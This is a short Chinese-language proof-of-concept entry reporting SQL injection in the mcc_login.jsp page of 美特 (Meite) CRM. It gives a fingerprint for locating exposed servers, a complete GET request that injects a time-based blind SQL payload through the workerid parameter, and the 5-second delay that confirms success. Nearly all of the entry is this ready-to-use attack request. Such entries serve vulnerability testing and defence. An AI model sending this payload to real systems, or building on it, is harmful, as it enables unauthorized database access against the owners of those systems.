# 美特CRM6mcc_login存在SQL注入漏洞

美特 ｜ SQL注入 ｜ —
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`GET /si/callcenter/solarun/mcc_login.jsp?workerid=1';WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1`
- **响应特征**：200 响应时间>=5s